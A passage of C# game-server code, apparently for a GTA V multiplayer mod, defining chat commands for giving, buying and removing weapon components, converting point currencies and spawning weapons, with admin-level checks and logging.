                    {
                        found = true;
                        itemData = i.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Name.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            itemData = i.Value;
                        }
                    }
                    if (i.Value.Name.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        itemData = i.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid weapon! Try using hashes or exact names.");
                return;
            }

            found = false;
            Int64 comphash = 0;
            Component comp = new Component();

            if (!Int64.TryParse(component, out comphash))
            {
                comphash = 0;
            }

            foreach (var item in itemData.Components)
            {
                if (comphash != 0)
                {
                    if (item.Key == wephash)
                    {
                        found = true;
                        comp = item.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (item.Value.Name.Contains(component, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            comphash = item.Key;
                            comp = item.Value;
                        }
                    }
                    if (item.Value.Name.Equals(component, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        comphash = item.Key;
                        comp = item.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid component! Try using hashes or exact names.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:takecomp:{target.Name}:{itemData.Name}:{comp.Name}"); } catch { }


            Dictionary<long, wComponentData> wepItems = new Dictionary<long, wComponentData>();

            Account acc = EPlayer.GetAccount(target);
            try
            {
                if (acc.WeaponComponents == null || acc.WeaponComponents.Length < 4) throw (new System.Exception("Invalid weapon component > going to new."));

                wepItems = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(acc.WeaponComponents);
            }
            catch
            {
                wepItems = new Dictionary<long, wComponentData>();

                wComponentData test = new wComponentData();
                test.Components.Add(123456789);
                wepItems.Add(123456789, test);
            }

            Dictionary<long, wComponentData> newWepData = new Dictionary<long, wComponentData>();

            foreach (KeyValuePair<long, wComponentData> i in wepItems)
            {
                wComponentData newDataTwo = new wComponentData();

                if (i.Key == wephash)
                {
                    newDataTwo = i.Value;
                    if (i.Value.Components.Contains(comphash)) newDataTwo.Components.Remove(comphash);
                }

                newWepData.Add(i.Key, newDataTwo);
            }

            wComponentData val = new wComponentData();
            if (newWepData.TryGetValue(wephash, out val))
            {
                if (val.Components.Count > 0)
                {
                    newWepData.Remove(wephash);
                }
            }

            EPlayer.GetAccount(target).WeaponComponents = NAPI.Util.ToJson(newWepData);

            Logs.LogAdmin(player, $"Removed {comp.Name} on {itemData.Name} from {target.Name}.");
            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have removed '{comp.Name}' on '{itemData.Name}' from {target.Name}.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has removed '{comp.Name}' on '{itemData.Name}' from you.");

            EPlayer.Save(target);
            return;
        }

        [Command("rules")]
        public void cmd_rules(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> As the rules have been changed multiple times in the past, please see the rule list in our discord server.");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!!] The list and discord server invite is available at /info.");
        }

        [Command("givecomp", "!{#AFAFAF}[USAGE] givecomp (target) (weapon/hash) (component/hash)", GreedyArg = true)]
        public void cmd_givecomp(Player player, Player target, string wep, string component)
        {
            if (!EPlayer.LoggedIn(player) || !EPlayer.LoggedIn(target))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 3 admin.");
                return;
            }


            Int64 wephash = 0;
            bool found = false;
            jWeaponData itemData = new jWeaponData();

            if (!Int64.TryParse(wep, out wephash))
            {
                wephash = 0;
            }

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        itemData = i.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Name.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            itemData = i.Value;
                        }
                    }
                    if (i.Value.Name.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        itemData = i.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid weapon! Try using hashes or exact names.");
                return;
            }

            found = false;
            Int64 comphash = 0;
            Component comp = new Component();

            if (!Int64.TryParse(component, out comphash))
            {
                comphash = 0;
            }

            foreach (var item in itemData.Components)
            {
                if (comphash != 0)
                {
                    if (item.Key == wephash)
                    {
                        found = true;
                        comp = item.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (item.Value.Name.Contains(component, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            comphash = item.Key;
                            comp = item.Value;
                        }
                    }
                    if (item.Value.Name.Equals(component, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        comphash = item.Key;
                        comp = item.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid component! List of supported comps on " + itemData.Name + ":");
                foreach (var item in itemData.Components)
                {
                    player.TriggerEvent("pushMsgToChat", item.Value.Name);
                }
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:givecomp:{target.Name}:{itemData.Name}:{comp.Name}"); } catch { }


            Dictionary<long, wComponentData> wepItems = new Dictionary<long, wComponentData>();

            Account acc = EPlayer.GetAccount(target);
            try
            {
                if (acc.WeaponComponents == null || acc.WeaponComponents.Length < 4) throw (new System.Exception("Invalid weapon component > going to new."));

                wepItems = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(acc.WeaponComponents);
            }
            catch
            {
                wepItems = new Dictionary<long, wComponentData>();

                wComponentData test = new wComponentData();
                test.Components.Add(123456789);
                wepItems.Add(123456789, test);
            }

            Dictionary<long, wComponentData> newWepData = new Dictionary<long, wComponentData>();

            foreach (KeyValuePair<long, wComponentData> i in wepItems)
            {
                wComponentData newDataTwo = new wComponentData();

                newDataTwo = i.Value;
                if (i.Key == wephash)
                {
                    if (!i.Value.Components.Contains(comphash)) newDataTwo.Components.Add(comphash);
                }

                newWepData.Add(i.Key, newDataTwo);
            }

            if (!newWepData.ContainsKey(wephash))
            {
                wComponentData newDataTwo = new wComponentData();

                newDataTwo.Components.Add(comphash);

                newWepData.Add(wephash, newDataTwo);
            }

            EPlayer.GetAccount(target).WeaponComponents = NAPI.Util.ToJson(newWepData);

            Logs.LogAdmin(player, $"Gave {target.Name} component {comp.Name} for {itemData.Name}.");

            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You gave '{comp.Name}' on '{itemData.Name}' to {target.Name}.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have been given '{comp.Name}' on '{itemData.Name}' by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}.");

            EPlayer.Save(target);
            return;
        }

        [Command("attachcomp", "!{#AFAFAF}[USAGE] attachcomp (target) (component/hash)", GreedyArg = true)]
        public void cmd_attachcomp(Player player, Player target, string component)
        {
            if (!EPlayer.LoggedIn(player) || !EPlayer.LoggedIn(target))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 3 admin.");
                return;
            }


            Int64 wephash = (Int64)target.CurrentWeapon;
            bool found = false;
            jWeaponData itemData = new jWeaponData();



            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        itemData = i.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target doesn't have a compatible weapon in hand! Try using hashes or exact names.");
                return;
            }

            found = false;
            Int64 comphash = 0;
            Component comp = new Component();

            if (!Int64.TryParse(component, out comphash))
            {
                comphash = 0;
            }

            foreach (var item in itemData.Components)
            {
                if (comphash != 0)
                {
                    if (item.Key == wephash)
                    {
                        found = true;
                        comp = item.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (item.Value.Name.Contains(component, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            comphash = item.Key;
                            comp = item.Value;
                        }
                    }
                    if (item.Value.Name.Equals(component, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        comphash = item.Key;
                        comp = item.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid component! List of supported comps on " + itemData.Name + ":");
                foreach (var item in itemData.Components)
                {
                    player.TriggerEvent("pushMsgToChat", item.Value.Name);
                }
                return;
            }


            EPlayer.AttachComponent(target, wephash, comphash);

            Logs.LogAdmin(player, $"Temporarily attached {comp.Name} on {itemData.Name} for {target.Name}.");
            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}Temporarily attached '{comp.Name}' on '{itemData.Name}' for {target.Name}.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}Temporarily attached '{comp.Name}' on '{itemData.Name}' by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}.");
            return;
        }

        [Command("removecomp", "!{#AFAFAF}[USAGE] removecomp (component/hash - hold weapon and use 'help' to list available)", GreedyArg = true)]
        public void cmd_removecomp(Player player, string component)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!player.HasData("CompNoRefundWarn"))
            {
                player.SetData("CompNoRefundWarn", true);
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!!] !{#FF0000}THIS ACTION IS IRREVERSIBLE AND NON REFUNDABLE, USE THE COMMAND AGAIN TO PROCEED.");
                return;
            }

            Int64 wephash = (Int64)player.CurrentWeapon;
            bool found = false;
            jWeaponData itemData = new jWeaponData();

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        itemData = i.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You don't have a compatible weapon in hand! Try using hashes or exact names.");
                return;
            }

            found = false;
            Int64 comphash = 0;
            Component comp = new Component();

            if (!Int64.TryParse(component, out comphash))
            {
                comphash = 0;
            }

            foreach (var item in itemData.Components)
            {
                if (comphash != 0)
                {
                    if (item.Key == wephash)
                    {
                        found = true;
                        comp = item.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (item.Value.Name.Contains(component, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            comphash = item.Key;
                            comp = item.Value;
                        }
                    }
                    if (item.Value.Name.Equals(component, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        comphash = item.Key;
                        comp = item.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}List of supported comps on " + itemData.Name + ":");
                foreach (var item in itemData.Components)
                {
                    player.TriggerEvent("pushMsgToChat", item.Value.Name);
                }
                return;
            }


            Dictionary<long, wComponentData> wepItems = new Dictionary<long, wComponentData>();

            Account acc = EPlayer.GetAccount(player);
            try
            {
                if (acc.WeaponComponents == null || acc.WeaponComponents.Length < 4) throw (new System.Exception("Invalid weapon component > going to new."));

                wepItems = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(acc.WeaponComponents);
            }
            catch
            {
                wepItems = new Dictionary<long, wComponentData>();

                wComponentData test = new wComponentData();
                test.Components.Add(123456789);
                wepItems.Add(123456789, test);
            }

            bool alreadyHas = false;
            Dictionary<long, wComponentData> newWepData = new Dictionary<long, wComponentData>();

            foreach (KeyValuePair<long, wComponentData> i in wepItems)
            {
                wComponentData newDataTwo = new wComponentData();

                newDataTwo = i.Value;
                if (i.Key == wephash)
                {
                    if (i.Value.Components.Contains(comphash))
                    {
                        alreadyHas = true;
                        newDataTwo.Components.Remove(comphash);
                    }
                }

                newWepData.Add(i.Key, newDataTwo);
            }

            if (!alreadyHas)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have " + comp.Name + " attached on " + itemData.Name + ".");
                return;
            }

            EPlayer.GetAccount(player).WeaponComponents = NAPI.Util.ToJson(newWepData);

            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You removed '{comp.Name}' from '{itemData.Name}' - No donator points will be refunded.");

            // try { Main.Log("currency.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:removecomp:{itemData.Name}:{comp.Name}"); } catch { }
            EPlayer.Save(player);
            return;
        }

        [Command("convertpoints", "!{#AFAFAF}[USAGE] convertpoints (amount) (standard to donator | donator to standard)", GreedyArg = true)]
        public void cmd_convertpoints(Player player, int amount, string type)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!type.Equals("standard to donator", StringComparison.OrdinalIgnoreCase) && !type.Equals("donator to standard", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Valid types of points are 'standard to donator' or 'donator to standard'");
                return;
            }

            if (player.HasData("ConvertingAmount") && player.GetData<int>("ConvertingAmount") != amount)
            {
                player.ResetData("ConvertingType");
                player.ResetData("ConvertingAmount");
            }

            Account acc = EPlayer.GetAccount(player);

            if (type.Equals("standard to donator", StringComparison.OrdinalIgnoreCase))
            {
                if (player.HasData("ConvertingType") && player.GetData<int>("ConvertingType") != 0)
                {
                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                }

                if (acc.Points < amount)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You don't possess !{#FF6347}" + $"{amount} !{{#FFFFFF}}points.");

                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                    return;
                }

                int singlePrice = 10; // 10 points = 1 donator point
                switch (acc.DonatorLevel)
                {
                    case 2:
                        singlePrice = 9;
                        break;
                    case 3:
                        singlePrice = 8;
                        break;
                    default:
                        singlePrice = 10;
                        break;

                }

                if (amount < singlePrice)
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}Minimum points you can convert is {singlePrice}. (Rate: -{singlePrice} points for each donator point)");

                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                    return;
                }

                int gain = amount / singlePrice;
                int remainder = amount % singlePrice;
                int remove = amount - remainder;

                if (player.HasData("ConvertingType") && player.HasData("ConvertingAmount") && player.GetData<int>("ConvertingType") == 0 && player.GetData<int>("ConvertingAmount") == amount)
                {
                    EPlayer.GivePoints(player, -remove);
                    acc.DonatorPoints += gain;

                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[#] !{{#FFFFFF}}You have converted !{{#FF6347}}{remove} points !{{#FFFFFF}} into !{{#33C446}}{gain} donator points!{{#FFFFFF}}.");
                    player.TriggerEvent("pushMsgToChat", $"!{{#d9f288}}Remaining Points: [{acc.Points}] !{{#FFFFFF}}| !{{#faf146}}Total Donator Points: [{acc.DonatorPoints}]");

                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                }
                else
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[#] !{{#FFFFFF}}You will gain !{{#33C446}}{gain} donator points !{{#FFFFFF}}in place of !{{#FF6347}}{remove} points!{{#FFFFFF}}, with !{{#33C446}}{remainder}!{{#FFFFFF}} being the remains of !{{#33C446}}{amount}!{{#FFFFFF}}.");
                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}>> !{{#FFFFFF}}If you wish to proceed with the conversion, type the command as it is again. (RATE: -{singlePrice} points per donator point)");
                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}NOTE: !{{#FFFFFF}}If you are just trying this for fun, please note there is irreversible LOSS in converting to points back.");

                    player.SetData("ConvertingType", 0);
                    player.SetData("ConvertingAmount", amount);
                }
            }
            else if (type.Equals("donator to standard", StringComparison.OrdinalIgnoreCase))
            {
                if (player.HasData("ConvertingType") && player.GetData<int>("ConvertingType") != 1)
                {
                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                }

                if (acc.DonatorPoints < amount)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You don't possess !{#FF6347}" + $"{amount} !{{#FFFFFF}}donator points.");

                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                    return;
                }

                int singleWorth = 5; // 5 points for each donator point
                switch (acc.DonatorLevel)
                {
                    case 1:
                        singleWorth = 6;
                        break;
                    case 2:
                        singleWorth = 7;
                        break;
                    case 3:
                        singleWorth = 8;
                        break;
                    default:
                        singleWorth = 5;
                        break;

                }

                if (amount == 0)
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}Minimum donator points you can convert is 1. (Rate: +{singleWorth} points for each donator point)");

                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                    return;
                }

                int gain = amount * singleWorth;

                if (player.HasData("ConvertingType") && player.HasData("ConvertingAmount") && player.GetData<int>("ConvertingType") == 1 && player.GetData<int>("ConvertingAmount") == amount)
                {
                    EPlayer.GivePoints(player, gain);
                    acc.DonatorPoints -= amount;

                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[#] !{{#FFFFFF}}You have converted !{{#FF6347}}{amount} donator points !{{#FFFFFF}} into !{{#33C446}}{gain} points!{{#FFFFFF}}.");
                    player.TriggerEvent("pushMsgToChat", $"!{{#faf146}}Remaining Donator Points: [{acc.DonatorPoints}] !{{#FFFFFF}}| !{{#d9f288}}Total Points: [{acc.Points}]");

                    player.ResetData("ConvertingType");
                    player.ResetData("ConvertingAmount");
                }
                else
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[#] !{{#FFFFFF}}You will gain !{{#33C446}}{gain} points !{{#FFFFFF}}in place of !{{#FF6347}}{amount} donator points!{{#FFFFFF}}.");
                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}>> !{{#FFFFFF}}If you wish to proceed with the conversion, type the command as it is again. (RATE: +{singleWorth} points per donator point)");
                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}NOTE: !{{#FFFFFF}}If you are just trying this for fun, please note there is irreversible LOSS in converting to donator points back.");

                    player.SetData("ConvertingType", 1);
                    player.SetData("ConvertingAmount", amount);
                }
            }
            return;
        }

        [Command("buycomp", "!{#AFAFAF}[USAGE] buycomp (component/hash - hold weapon and use 'help' to list available)", GreedyArg = true)]
        public void cmd_buycomp(Player player, string component)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            Int64 wephash = (Int64)player.CurrentWeapon;
            bool found = false;
            jWeaponData itemData = new jWeaponData();

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        itemData = i.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You don't have a compatible weapon in hand! Try using hashes or exact names.");
                return;
            }

            found = false;
            Int64 comphash = 0;
            Component comp = new Component();

            if (!Int64.TryParse(component, out comphash))
            {
                comphash = 0;
            }

            foreach (var item in itemData.Components)
            {
                if (comphash != 0)
                {
                    if (item.Key == wephash)
                    {
                        found = true;
                        comp = item.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (item.Value.Name.Contains(component, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            comphash = item.Key;
                            comp = item.Value;
                        }
                    }
                    if (item.Value.Name.Equals(component, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        comphash = item.Key;
                        comp = item.Value;
                    }
                }
            }

            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}List of supported comps on " + itemData.Name + ":");
                foreach (var item in itemData.Components)
                {
                    if (item.Value.Name.EndsWith("Rounds")) continue;
                    player.TriggerEvent("pushMsgToChat", item.Value.Name);
                }
                return;
            }

            if (EPlayer.GetAccount(player).DonatorPoints < 25 && !comp.Name.Contains("flashlight", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You need at least 25 donator points to buy a weapon component. (Flashlights are free)");
                return;
            }

            if (comp.Name.EndsWith("Rounds"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Special ammunition components are not allowed.");
                return;
            }

            Dictionary<long, wComponentData> wepItems = new Dictionary<long, wComponentData>();

            Account acc = EPlayer.GetAccount(player);
            try
            {
                if (acc.WeaponComponents == null || acc.WeaponComponents.Length < 4) throw (new System.Exception("Invalid weapon component > going to new."));

                wepItems = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(acc.WeaponComponents);
            }
            catch
            {
                wepItems = new Dictionary<long, wComponentData>();

                wComponentData test = new wComponentData();
                test.Components.Add(123456789);
                wepItems.Add(123456789, test);
            }

            bool alreadyHas = false;
            Dictionary<long, wComponentData> newWepData = new Dictionary<long, wComponentData>();

            foreach (KeyValuePair<long, wComponentData> i in wepItems)
            {
                wComponentData newDataTwo = new wComponentData();

                newDataTwo = i.Value;
                if (i.Key == wephash)
                {
                    if (!i.Value.Components.Contains(comphash)) newDataTwo.Components.Add(comphash);
                    else
                    {
                        alreadyHas = true;
                    }
                }

                newWepData.Add(i.Key, newDataTwo);
            }

            if (alreadyHas)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have already bought this component!");
                return;
            }


            if (!newWepData.ContainsKey(wephash))
            {
                wComponentData newDataTwo = new wComponentData();

                newDataTwo.Components.Add(comphash);

                newWepData.Add(wephash, newDataTwo);
            }

            EPlayer.GetAccount(player).WeaponComponents = NAPI.Util.ToJson(newWepData);

            if (comp.Name.Contains("flashlight", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have attached '{comp.Name}' on '{itemData.Name}'. (Will attach in copchase)");
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You bought '{comp.Name}' on '{itemData.Name}' for 25 donator points. (Will attach in copchase)");
                EPlayer.GetAccount(player).DonatorPoints -= 25;
            }

            // try { Main.Log("currency.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:buycomp:{itemData.Name}:{comp.Name}"); } catch { }
            EPlayer.Save(player);
            return;
        }

        [Command("mycomps", GreedyArg = true)]
        public void cmd_mycomps(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}Listing bought weapon components ->");

            Dictionary<long, wComponentData> wepItems = new Dictionary<long, wComponentData>();

            Account acc = EPlayer.GetAccount(player);
            try
            {
                if (acc.WeaponComponents == null || acc.WeaponComponents.Length < 4) throw (new System.Exception("Invalid weapon component > going to new."));

                wepItems = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(acc.WeaponComponents);
            }
            catch
            {
                wepItems = new Dictionary<long, wComponentData>();

                wComponentData test = new wComponentData();
                test.Components.Add(123456789);
                wepItems.Add(123456789, test);
            }

            int count = 0;
            foreach (KeyValuePair<long, wComponentData> i in wepItems)
            {
                jWeaponData wep = new jWeaponData();

                if (Settings.WeaponData.TryGetValue(i.Key, out wep))
                {
                    if (i.Value.Components.Count > 0) player.TriggerEvent("pushMsgToChat", "!{#31b55a}" + wep.Name + " | " + i.Value.Components.Count() + " attachments:");
                    foreach (long comp in i.Value.Components)
                    {
                        Component compData = new Component();
                        if (wep.Components.TryGetValue(comp, out compData))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#69f5a8}     -- " + compData.Name + " | " + compData.Description);
                            count++;
                        }
                    }
                }
            }

            if (count == 0) player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have not bought any weapon components yet, /buycomp.");
            return;
        }

        [Command("givegun", "!{#AFAFAF}[USAGE] givegun (target) (ammo) (weapon)", GreedyArg = true)]
        public void cmd_givegun(Player player, Player target, int ammo, string wep)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 3 admin.");
                return;
            }


            Int64 wephash = 0;
            bool found = false;
            string wepname = "";

            if (!Int64.TryParse(wep, out wephash))
            {
                wephash = 0;
            }

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        wepname = i.Value.Name;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Name.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            wepname = i.Value.Name;
                        }
                    }
                    if (i.Value.Name.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        wepname = i.Value.Name;
                    }
                }
            }

            foreach (KeyValuePair<long, string> i in Main.WeaponReasons)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        wepname = i.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            wepname = i.Value;
                        }
                    }
                    if (i.Value.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        wepname = i.Value;
                    }
                }
            }


            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid weapon! Try using hashes or exact names.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:givegun:{target.Name}:{wepname}:{ammo}"); } catch { }

            Logs.LogAdmin(player, $"Gave {target.Name} a {wepname} with {ammo} ammo.");

            target.GiveWeapon((WeaponHash)wephash, ammo);

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have given a " + wepname + " with " + ammo + " ammo to the target.");
            return;
        }

        [Command("gun", "!{#AFAFAF}[USAGE] gun (ammo) (weapon)", GreedyArg = true)]
        public void cmd_gun(Player player, int ammo, string wep)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3 || player.Dimension <= 256 || player.Dimension > 512)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam or in default world! (/world)");
                return;
            }


            Int64 wephash = 0;
            bool found = false;
            string wepname = "";

            if (!Int64.TryParse(wep, out wephash))
            {
                wephash = 0;
            }

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        wepname = i.Value.Name;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Name.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            wepname = i.Value.Name;
                        }
                    }
                    if (i.Value.Name.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        wepname = i.Value.Name;
                    }
                }
            }

            foreach (KeyValuePair<long, string> i in Main.WeaponReasons)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        wepname = i.Value;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            wepname = i.Value;
                        }
                    }
                    if (i.Value.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        wepname = i.Value;
                    }
                }
            }


            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid weapon! Try using hashes or exact names.");
                return;
            }

            // try { Main.Log("freeroam.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:gun:{wepname}:{ammo}"); } catch { }

            player.GiveWeapon((WeaponHash)wephash, ammo);

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have given yourself " + wepname + " with " + ammo + " ammo.");
            return;
        }

